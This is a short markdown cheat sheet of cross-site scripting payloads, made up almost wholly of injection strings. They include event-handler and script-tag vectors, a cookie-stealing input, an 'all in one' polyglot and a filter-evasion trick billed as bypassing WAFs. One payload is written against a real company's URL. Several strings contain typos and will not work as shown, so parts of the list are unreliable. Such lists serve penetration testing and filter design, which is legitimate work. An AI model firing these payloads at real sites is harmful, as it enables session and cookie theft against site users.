# Payloads

Some nice payloads:

```html
<img/src/onerror=alert(origin)>
<img/src/onerror=\u0061lert?.(origin)>
<details/open/ontoogle=JS>
<script src=data:,alert(origin)></script>
https://www.akamai.com/?xss=%3cinput/onbeforinput=%27a=alert,a(1)%27%3E
"><ifame srcdoc="">
">%26%2300%3B</form><input+type="s"/onfocus="alert(document.cookie)"/autofocus>
">&#00;</form><input type&#61;"s" onfocus="alert(1)" autofocus>
<img/serset":"/onloaded=alert(1)>
<svg onload=location=name>
<a/href=javascript&colon;alert()>click

```

All in one but noisy

```
JavaScirpt://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\/*%26apos;)*<!--></Title></textArea></iFrame></noScript></style>/autoFocus/Onfocus=/*{/*/;{/**/a=(alert(1)}//<Base/Href=//X55.is\76-->
```

All payloads that bypass WAFs

```bash
 onload=top[/al/.source+/ert/.source]`origin`>hi</a> => alert is filtered!!
```

XSS Without `()`

[XSS-Payloads/Without-Parentheses.md at master · RenwaX23/XSS-Payloads](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)